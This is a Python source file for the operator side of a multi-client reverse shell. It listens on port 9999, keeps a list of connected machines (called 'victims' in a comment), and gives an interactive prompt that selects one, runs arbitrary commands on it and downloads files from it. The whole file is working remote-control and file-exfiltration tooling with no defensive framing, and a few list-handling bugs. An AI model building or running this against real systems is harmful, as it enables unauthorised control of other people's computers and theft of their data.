import socket
import sys
import os
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

SEPARATOR="<SEPARATOR"
BUFFER_SIZE=1024

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client

def start_turtle():

    while True:
        print("Your Shell> ",end="")
        cmd = input()
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("ID  --IP address--   PORT" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        global target
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("\nYou are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:

            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                if 'send' in cmd:
                    try:
                        conn.send(str.encode(cmd))
                        received=conn.recv(BUFFER_SIZE).decode()
                        filename,filesize=received.split(SEPARATOR)
                        filename=os.path.basename(filename)
                        print("\tReceiving File named: "+filename)
                        print(int(filesize))
                        with open(filename, "wb") as file:
                            data=conn.recv(int(filesize))
                            file.write(data)

                        print(str(all_address[target][0]) + ">", end="")
                    except:
                        print("Error Receiving file")
                else:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")

        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
